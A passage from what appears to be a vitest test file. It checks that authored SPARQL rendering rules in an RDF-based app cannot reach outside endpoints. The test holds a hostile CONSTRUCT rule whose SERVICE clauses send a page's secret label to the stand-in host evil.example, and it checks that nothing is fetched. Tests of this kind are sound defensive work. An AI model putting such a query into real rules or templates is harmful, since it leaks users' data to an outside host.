ex:LeakRendering-sparql a sem:Rule ; sem:implements ex:LeakRendering ; sem:construct """
PREFIX ex: <${EX}>
CONSTRUCT { ?root a rdfhtml:Div ; sem:renders $this ; rdfhtml:hasChild ?t . ?t a rdfhtml:Text ; rdfhtml:data ?got . }
WHERE {
  $this a ex:Leak ; c:label ?label .
  SERVICE SILENT <https://evil.example/sparql> { ?x ?y ?label }
  SERVICE <https://evil.example/sparql> { ?got ?y ?label }
  BIND(IRI(CONCAT(STR($this), "/~root")) AS ?root)
  BIND(IRI(CONCAT(STR($this), "/~t")) AS ?t)
}""" .
ex:secret a ex:Leak ; c:label "the page's secret" .`
    const errors: string[] = []
    const report = (...args: unknown[]) => void errors.push(args.map((a) => String((a as Error)?.message ?? a)).join(' '))
    vi.spyOn(console, 'error').mockImplementation(report)
    vi.spyOn(console, 'warn').mockImplementation(report)
    // A rule's failure is reported, or ends the mount: either way, nothing is fetched.
    let app: MountedApp | undefined
    try {
      app = await mount(document.getElementById('app')!, {
      root: EX + 'page',
      graphs: [`${PFX}ex:page a c:Stack ; c:children ( ex:secret ) .`],
      authored: [authored],
      store: 'wat',
      // Listed by the host: still, no rule reaches it.
      fetchPolicy: { endpoints: { 'https://evil.example/sparql': {} } },
      files: false,
      fullscreen: false,
      onRefused: () => {},
      navigation: navigation(),
      })
      apps.push(app)
    } catch (err) {
      errors.push((err as Error).message)
    }
    expect(fetched.filter((u) => !u.endsWith('.wasm'))).toEqual([])
    expect(errors.join('\n')).toMatch(/only store.query and store.update run them/)
    // The host's own query does reach it.
    if (app) {
      await app.store.query('SELECT * { SERVICE <https://evil.example/sparql> { ?s ?p ?o } }')
      expect(fetched.filter((u) => !u.endsWith('.wasm'))).toEqual(['https://evil.example/sparql'])
    }
  })
})
